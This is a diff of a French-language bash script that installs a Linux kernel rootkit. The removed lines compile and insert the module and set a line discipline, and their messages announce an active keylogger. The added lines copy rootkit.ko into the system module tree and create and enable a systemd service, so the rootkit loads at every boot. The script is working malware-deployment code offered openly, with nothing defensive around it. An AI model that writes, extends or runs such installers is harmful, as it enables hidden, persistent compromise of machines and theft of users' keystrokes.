@@ -1,29 +1,32 @@
 #!/bin/bash
 
-set -e  # Arrête en cas d'erreur
+echo "[+] Compilation du module..."
+make
 
-KERNEL_DIR=kernel
-USER_DIR=user
-DEVICE=$(tty)
+echo "[+] Insertion du module..."
+sudo insmod rootkit.ko
 
-echo "[*] Compilation du module kernel..."
-make -C /lib/modules/$(uname -r)/build M=$(pwd)/$KERNEL_DIR modules
+echo "[+] Copie du module dans /lib/modules/ et update..."
+sudo cp rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/
+sudo depmod
 
-echo "[*] Compilation du programme utilisateur..."
-gcc -Wall -O2 -o $USER_DIR/set_ldisc $USER_DIR/set_ldisc.c
+echo "[+] Création du service systemd..."
 
-echo "[*] Insertion du module kernel..."
-sudo insmod $KERNEL_DIR/rootkit.ko || {
-    echo "[!] Échec du chargement du module kernel"
-    exit 1
-}
+cat <<EOF | sudo tee /etc/systemd/system/rootkit.service
+[Unit]
+Description=Module Rootkit 
+After=network.target
 
-echo "[*] Application de la line discipline à $DEVICE..."
-sudo ./$USER_DIR/set_ldisc $DEVICE || {
-    echo "[!] Échec du changement de line discipline"
-    exit 1
-}
+[Service]
+Type=oneshot
+ExecStart=/sbin/insmod /lib/modules/$(uname -r)/kernel/drivers/rootkit.ko
+ExecStop=/sbin/rmmod rootkit
 
-echo "[+] Rootkit installé et keylogger activé."
-echo "[+] Tu peux taper du texte ici, appuie sur ENTRÉE pour logguer."
-echo "[+] Vérifie les logs avec : sudo dmesg | tail -n 20"
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reexec
+sudo systemctl enable rootkit.service
+
+echo "[+] Rootkit installé et service activé."
